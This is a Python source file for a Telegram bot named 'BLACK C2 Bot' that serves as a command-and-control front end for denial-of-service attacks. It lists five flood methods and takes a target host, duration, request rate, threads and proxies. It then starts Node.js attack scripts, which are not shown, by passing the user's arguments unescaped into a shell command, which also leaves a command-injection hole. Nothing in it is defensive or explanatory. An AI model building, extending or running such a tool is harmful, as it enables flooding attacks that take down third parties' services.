import os
import subprocess
import telebot

# Replace with your actual bot token from BotFather
TOKEN = ""  # Example format

# Replace with your Telegram user ID (Admin)
ADMIN_ID = 7593930576  

# Validate token format
if ":" not in TOKEN:
    raise ValueError("❌ Invalid bot token! Make sure the token contains a colon.")

bot = telebot.TeleBot(TOKEN)

# Files
PREMIUM_USERS_FILE = "premium_users.txt"
PROXY_FILE = "proxy.txt"
UA_FILE = "user-agents.txt"

def is_premium(user_id):
    """Check if a user is premium."""
    try:
        with open(PREMIUM_USERS_FILE, "r") as f:
            return str(user_id) in f.read().splitlines()
    except FileNotFoundError:
        return False

@bot.message_handler(commands=["start"])
def send_welcome(message):
    """Send welcome message on /start."""
    user = message.from_user
    response = (
        f"> Hey {user.first_name}, Welcome to BLACK C2 Bot!\n"
        f"UserID: {user.id}\n\n"
        "Commands:\n"
        "/attack <method> <args> - Start a Attack\n"
        "/methods - Show attack methods\n"
        "/proxycount - Show proxy count\n"
        "/uacount - Show user-agent count\n"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=["methods"])
def show_methods(message):
    """Show attack methods."""
    methods = (
        "Available Methods:\n"
        "- TLS → /attack TLS <HOST> <TIME> <RPS> <THREADS>\n"
        
        "- HYPER → /attack HYPER <URL> <TIME>\n"
        
        "- 404 → /attack 404 <HOST> <TIME> <RPS> <THREADS> <PROXY>\n"
        
        "- NOX → /attack NOX <HOST> <TIME> <THREADS> <RPS> <PROXY>\n"
        
        "- BOT → /attack BOT <HOST> <TIME> <RPS> <THREADS> <PROXY>\n"
    )
    bot.reply_to(message, methods)

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    """Handle attack command."""
    args = message.text.split()

    if len(args) < 2:
        return bot.reply_to(message, "Usage: /attack <METHOD> [parameters]")

    method = args[1].upper()

    attack_formats = {
        "TLS": "/attack TLS <HOST> <TIME> <RPS> <THREADS>",
        
        "HYPER": "/attack HYPER <URL> <TIME>",
        
        "404": "/attack 404 <HOST> <TIME> <RPS> <THREADS> <PROXY>",
        
        "NOX": "/attack NOX <HOST> <TIME> <THREADS> <RPS> <PROXY>",
        
        "BOT": "/attack BOT <HOST> <TIME> <RPS> <THREADS> <PROXY>",
    }

    if method in attack_formats and len(args) < len(attack_formats[method].split()):
        return bot.reply_to(message, f"Invalid usage!\nCorrect format: {attack_formats[method]}")

    if method == "TLS":
        _, _, host, time, rps, threads = args
        command = f"node TLS.js {host} {time} {rps} {threads}"

    elif method == "HYPER":
        _, _, url, time = args
        command = f"node hyper.js {url} {time}"

    elif method == "404":
        _, _, host, time, rps, threads, proxy = args
        command = f"node 404.js {host} {time} {rps} {threads} {proxy}"

    elif method == "NOX":
        _, _, host, time, threads, rps, proxy = args
        command = f"node NOX.js {host} {time} {threads} {rps} {proxy}"

    elif method == "BOT":
        _, _, host, time, rps, threads, proxy = args
        command = f"node BOT.js {host} {time} {rps} {threads} {proxy}"

    else:
        return bot.reply_to(message, "❌ Invalid method! Use /methods to see available options.")

    try:
        subprocess.Popen(command, shell=True)
        bot.reply_to(message, f"✅ Attack started using {method} method!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error starting attack: {str(e)}")

if __name__ == "__main__":
    bot.polling(none_stop=True)